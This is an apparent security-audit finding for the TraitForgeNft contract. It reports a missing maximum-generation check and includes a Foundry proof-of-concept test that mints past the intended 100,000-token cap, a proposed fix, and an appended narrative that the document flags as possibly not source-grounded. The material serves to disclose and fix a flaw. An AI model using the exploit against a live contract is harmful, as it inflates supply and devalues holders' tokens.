---
id: 21795
severity: "High"
---

# The maximum number of generations is infinite

## Description

In ‘TraitForgeNft’ there should be a maximum number of generations (it should be capped at 10), but instead, users can mint infinite generations and there is not a limit.

## Proof of Concept

Foundry:

```solidity
function test_vulnerability_NumberOfGenerationsIsInfinite() public {
    vm.startPrank(owner); 
    //Here the owner sets all the contracts, transfer ownerhsip and writes batch
    traitForgeNft.setAirdropContract(address(airdropContract));
    traitForgeNft.setEntityForgingContract(address(entityForging));
    traitForgeNft.setEntropyGenerator(address(entropyGenerator));
    airdropContract.transferOwnership(address(traitForgeNft));
    entropyGenerator.transferOwnership(address(traitForgeNft));
    entropyGenerator.writeEntropyBatch1();
    vm.stopPrank(); 
    
    address user1 = address(123); 
    //Assigning 100000 ether to user1
    deal(user1, 100000 ether); 
    vm.startPrank(user1); 
    skip(2 days);
    bytes32[] memory proof = new bytes32[](1); 
    proof[0] = keccak256(abi.encode("Hi")); 
    
    //User mints generation 1
    uint256 price = traitForgeNft.startPrice(); 
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price}(proof);
    price += traitForgeNft.priceIncrement() * traitForgeNft.getGeneration(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 10000); 
    //User mints generation 2
    uint256 price2 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price2}(proof);
    price2 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 20000);
    //User mints generation 3
    uint256 price3 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price3}(proof);
    price3 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 30000);
    //User mints generation 4
    uint256 price4 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price4}(proof);
    price4 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 40000);
    //User mints generation 5
    uint256 price5 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price5}(proof);
    price5 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 50000);
    //User mints generation 6
    uint256 price6 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price6}(proof);
    price6 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 60000);
    //User mints generation 7
    uint256 price7 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price7}(proof);
    price7 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 70000);
    //User mints generation 8
    uint256 price8 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price8}(proof);
    price8 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 80000);
    //User mints generation 9
    uint256 price9 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price9}(proof);
    price9 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 90000);
    //User mints generation 10
    uint256 price10 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price10}(proof);
    price10 = traitForgeNft.calculateMintPrice(); 
    }
    assertEq(traitForgeNft.balanceOf(user1), 100000);
    //User mints generation 11, this get also minted!
    uint256 price11 = traitForgeNft.calculateMintPrice();
    for(uint256 i = 0; i < 10000; i++){
    traitForgeNft.mintToken{value: price11}(proof);
    price11 = traitForgeNft.calculateMintPrice(); 
    }
    //Finally we can see that the user owns 110.000 NFT's, when the maximum would be 100.000
    assertEq(traitForgeNft.balanceOf(user1), 110000);
  }
```

## Recommendation

In `TraiForgeNft::_incrementGeneration`, add a check in order to do not allow the the mint of the NFT’s above the maximum generation.

Instead of doing this:

```solidity
function _incrementGeneration() private {
    require(
      generationMintCounts[currentGeneration] >= maxTokensPerGen,
      'Generation limit not yet reached'
    );
    currentGeneration++;
    generationMintCounts[currentGeneration] = 0;
    priceIncrement = priceIncrement + priceIncrementByGen;
    entropyGenerator.initializeAlphaIndices();
    emit GenerationIncremented(currentGeneration);
  }
```

Consider doing this:

```solidity
function _incrementGeneration() private {
    require(
      generationMintCounts[currentGeneration] >= maxTokensPerGen,
      'Generation limit not yet reached'
    );
    currentGeneration++;
    require(currentGeneration <= maxGeneration,
     'Maximum generation reached'
    ); 
    generationMintCounts[currentGeneration] = 0;
    priceIncrement = priceIncrement + priceIncrementByGen;
    entropyGenerator.initializeAlphaIndices();
    emit GenerationIncremented(currentGeneration);
  }
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a logical constraint omission that allows the TraitForgeNft contract to mint an unlimited number of NFT generations, even though the design specifies a maximum of ten generations. The root cause lies in the private function that increments the current generation; it checks only that the per‑generation token limit has been reached before advancing, but it never verifies that the new generation number exceeds the configured maxGeneration value. Because of this missing guard, once the tenth generation is completed the contract continues to increment the generation counter and permits further minting. An attacker or any user can exploit the flaw by repeatedly calling the mint function after each generation’s token quota is satisfied, causing the contract to create additional NFTs beyond the intended supply cap. The impact is a severe inflation of the token supply: users can acquire far more NFTs than the protocol’s economic model anticipates, which can devalue existing tokens, undermine revenue projections, and break accounting assumptions that rely on a fixed maximum supply. The condition occurs whenever the minting logic reaches the per‑generation limit and triggers the generation increment; without a max‑generation check, the contract proceeds indefinitely. All participants—token holders, the protocol’s governance, and developers—are affected because the tokenomics are compromised and the protocol may appear to be issuing tokens for free. The issue was discovered during a formal audit when a test script minted 100 000 tokens across ten generations and then continued to mint another 10 000 tokens in an eleventh generation, confirming that the balance exceeded the expected maximum. The bug is subtle because the contract does not emit an explicit error; the UI simply shows the user’s balance increasing, which may be interpreted as normal behavior. To remediate, the generation‑increment function should include a require statement that enforces currentGeneration <= maxGeneration before allowing the increment, or the minting entry point should reject calls once the maximum generation has been reached. This class of bug is a missing state‑validation or constraint‑enforcement error, often categorized as a business‑logic flaw rather than an access‑control issue. From the user’s perspective, the expectation that minting stops after ten generations is violated; instead the user sees their wallet balance continue to grow, potentially receiving NFTs they did not anticipate, which contradicts the protocol’s advertised limits.
